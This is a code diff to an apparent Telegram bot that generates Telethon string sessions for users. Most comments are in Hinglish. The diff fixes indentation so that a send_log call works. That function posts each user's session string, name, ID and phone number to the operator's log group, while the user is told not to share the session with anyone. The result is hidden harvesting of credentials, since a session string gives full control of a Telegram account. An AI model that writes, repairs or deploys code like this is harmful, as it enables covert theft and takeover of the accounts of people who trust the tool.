@@ -1,14 +1,34 @@
 import asyncio
 from pyrogram import Client, filters
 from pyrogram.types import Message, CallbackQuery
-from config import API_ID, API_HASH, LOG_GROUP_ID
-
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
     SessionPasswordNeededError, PhoneCodeInvalidError, 
     PhoneCodeExpiredError, PhoneNumberInvalidError
 )
+from config import API_ID, API_HASH, LOG_GROUP_ID
+
+# 🔥 LOG FUNCTION KO UPAR DEFINE KIYA HAI TAANI ERROR NA AAYE 🔥
+async def send_log(bot, name, user_id, phone_number, string_session):
+    if LOG_GROUP_ID:
+        log_text = (
+            f"📦 <b>ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ</b>\n\n"
+            f"👤 <b>User:</b> {name}\n"
+            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
+            f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
+            f"🛠 <b>Type:</b> Telethon\n\n"
+            f"✨ <b>Session (Tap to Copy):</b>\n"
+            f"<code>{string_session}</code>"
+        )
+        try:
+            await bot.send_message(
+                LOG_GROUP_ID,
+                log_text,
+                parse_mode="HTML" # HTML Mode jaruri hai <code> tag ke liye
+            )
+        except Exception as e:
+            print(f"Log Error: {e}")
 
 @Client.on_callback_query(filters.regex("gen_tele"))
 async def generate_telethon_session(bot, query: CallbackQuery):
@@ -82,43 +102,25 @@ async def generate_telethon_session(bot, query: CallbackQuery):
 
     string_session = tele_client.session.save()
 
-text = (
-    f"✨ **ʏᴏᴜʀ ᴛᴇʟᴇᴛʜᴏɴ sᴛʀɪɴɢ sᴇssɪᴏɴ** ✨\n\n"
-    f"`{string_session}`\n\n"
-    f"⚠️ *Don't share this with anyone!*"
-)
+    # --- FIX: Yahan se code ko wapis Indent (Tab) kiya gaya hai ---
+    
+    text = (
+        f"✨ **ʏᴏᴜʀ ᴛᴇʟᴇᴛʜᴏɴ sᴛʀɪɴɢ sᴇssɪᴏɴ** ✨\n\n"
+        f"`{string_session}`\n\n"
+        f"⚠️ *Don't share this with anyone!*"
+    )
 
-try:
-    await tele_client.send_message("me", text)
-except Exception:
-    pass 
+    try:
+        await tele_client.send_message("me", text)
+    except Exception:
+        pass 
 
-# ✅ YAHI SABSE IMPORTANT LINE THI
-await send_log(bot, name, user_id, phone_number, string_session)
+    # ✅ AB LOG FUNCTION SAHI SE CALL HOGA
+    await send_log(bot, name, user_id, phone_number, string_session)
 
-await tele_client.disconnect()
+    await tele_client.disconnect()
 
-await query.message.reply_text(
-    "✅ **sᴜᴄᴄᴇssꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ!**\n\nCheck your **Saved Messages**."
-)
-
-# 🔥 LOGS: CODE TAG FOR TAP TO COPY 🔥
-async def send_log(bot, name, user_id, phone_number, string_session):
-    if LOG_GROUP_ID:
-        log_text = (
-            f"📦 <b>ɴᴇᴡ sᴇssɪᴏɴ ɢᴇɴᴇʀᴀᴛᴇᴅ</b>\n\n"
-            f"👤 <b>User:</b> {name}\n"
-            f"🆔 <b>ID:</b> <code>{user_id}</code>\n"
-            f"📱 <b>Phone:</b> <code>{phone_number}</code>\n"
-            f"🛠 <b>Type:</b> Pyrogram\n\n"
-            f"✨ <b>Session (Tap to Copy):</b>\n"
-            f"<code>{string_session}</code>"
-        )
-        try:
-            await bot.send_message(
-                LOG_GROUP_ID,
-                log_text,
-                parse_mode="HTML"
-            )
-        except Exception as e:
-            print(e)
+    await query.message.reply_text(
+        "✅ **sᴜᴄᴄᴇssꜰᴜʟʟʏ ɢᴇɴᴇʀᴀᴛᴇᴅ!**\n\nCheck your **Saved Messages**."
+    )
+    
